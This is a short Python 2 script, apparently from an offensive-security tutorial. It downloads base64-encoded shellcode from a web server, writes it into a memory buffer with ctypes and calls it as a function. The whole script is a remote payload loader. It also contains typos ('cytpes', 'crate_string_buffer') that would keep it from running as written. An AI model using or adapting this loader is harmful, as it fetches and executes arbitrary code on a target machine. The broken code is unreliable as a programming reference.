import urllib2
import cytpes
import base64

# retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# create a buffer in memory
shellcode_buffer = ctypes.crate_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func = cytpes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()